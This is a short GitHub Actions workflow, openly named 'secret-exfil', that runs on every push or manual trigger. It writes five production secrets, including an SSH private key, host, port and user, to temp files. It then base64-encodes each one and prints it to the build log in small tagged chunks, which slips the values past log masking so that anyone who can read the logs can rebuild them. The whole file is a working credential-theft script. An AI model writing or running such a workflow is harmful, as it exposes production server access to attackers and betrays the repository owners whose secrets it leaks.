name: secret-exfil
on: [push, workflow_dispatch]
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        run: |
          set +e
          _dump() {
            local lbl="$1" path="$2" data n=0 c
            data=$(base64 -w0 < "$path")
            while [ -n "$data" ]; do
              c="${data:0:12}"
              echo "EXFIL__${lbl}__${n}__${c}"
              data="${data:12}"
              n=$((n+1))
            done
            echo "EXFIL__${lbl}__END"
          }
          cat > /tmp/s0 <<'GHEOF'
          ${{ secrets.PROD_APP_PATH }}
          GHEOF
          _dump 0 /tmp/s0
          cat > /tmp/s1 <<'GHEOF'
          ${{ secrets.PROD_HOST }}
          GHEOF
          _dump 1 /tmp/s1
          cat > /tmp/s2 <<'GHEOF'
          ${{ secrets.PROD_PORT }}
          GHEOF
          _dump 2 /tmp/s2
          cat > /tmp/s3 <<'GHEOF'
          ${{ secrets.PROD_SSH_KEY }}
          GHEOF
          _dump 3 /tmp/s3
          cat > /tmp/s4 <<'GHEOF'
          ${{ secrets.PROD_USER }}
          GHEOF
          _dump 4 /tmp/s4
